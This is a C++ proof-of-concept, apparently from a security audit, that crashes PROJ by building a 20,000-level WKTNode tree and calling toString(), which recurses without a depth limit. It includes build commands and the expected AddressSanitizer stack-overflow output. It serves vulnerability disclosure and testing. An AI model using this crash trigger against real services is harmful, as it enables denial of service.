// SF09 PoC: Stack overflow via unbounded recursion in WKTNode::toString()
// 
// VULNERABILITY: WKTNode::toString() in PROJ/src/iso19111/io.cpp (line 1237)
// recursively calls itself for each child node with NO depth limit.
//
// While WKTNode::createFrom() (the WKT parser) has a depth limit of 16,
// the WKTNode::toString() method has NO such limit.
//
// An attacker can create a deeply nested WKTNode tree programmatically
// (via the public API: WKTNode constructor + addChild) and call toString(),
// causing a stack overflow crash.
//
// CVSS: This is exploitable via the public API (PROJ C++ API consumers),
// and any code path that builds a WKT tree from user input and calls toString().
//
// REPRODUCTION:
//   clang++ -std=c++17 -fsanitize=address -g -O1 \
//     -I/src/PROJ/include -I/src/PROJ/src \
//     io_sf09_poc.cpp /proj4-build/lib/libproj.a \
//     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm -o poc
//   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./poc 20000
//
// EXPECTED OUTPUT:
//   AddressSanitizer: stack-overflow on address ...
//   in osgeo::proj::io::WKTNode::toString() at io.cpp:1247

#include <iostream>
#include <string>
#include <memory>
#include "proj/io.hpp"
#include "proj/util.hpp"

using namespace osgeo::proj::io;
using namespace osgeo::proj::util;

int main(int argc, char** argv) {
    int depth = 20000;
    if (argc > 1) {
        depth = std::stoi(argv[1]);
    }
    
    std::cerr << "[SF09] Building WKT node tree with depth " << depth << std::endl;
    
    // Build a deeply nested tree using the PUBLIC API.
    // This bypasses createFrom()'s depth limit of 16 because we're using
    // WKTNode() constructor + addChild() directly.
    auto leaf = NN_NO_CHECK(std::make_unique<WKTNode>("leaf_value"));
    auto current = NN_NO_CHECK(std::make_unique<WKTNode>("node0"));
    current->addChild(std::move(leaf));
    
    for (int i = 1; i < depth; i++) {
        auto parent = NN_NO_CHECK(std::make_unique<WKTNode>(
            std::string("node") + std::to_string(i)));
        parent->addChild(std::move(current));
        current = std::move(parent);
    }
    
    std::cerr << "[SF09] Tree built with depth " << depth 
              << ", calling toString()..." << std::endl;
    
    // WKTNode::toString() recursively calls itself for each child.
    // At depth ~14000-15000 (system-dependent), this causes a stack overflow.
    try {
        std::string result = current->toString();
        std::cerr << "[SF09] toString() returned string of length " 
                  << result.size() << " (no crash)" << std::endl;
    } catch (const std::exception& e) {
        std::cerr << "[SF09] Exception caught: " << e.what() << std::endl;
    }
    
    return 0;
}
